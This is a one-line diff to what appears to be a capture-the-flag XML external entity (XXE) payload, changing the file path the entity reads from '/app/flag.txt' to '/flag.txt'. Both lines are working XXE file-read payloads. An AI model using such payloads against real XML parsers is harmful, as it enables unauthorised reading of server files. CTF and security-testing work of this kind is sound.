@@ -1,1 +1,1 @@
-<!ENTITY xxe SYSTEM "file:///app/flag.txt">
+<!ENTITY xxe SYSTEM "file:///flag.txt">
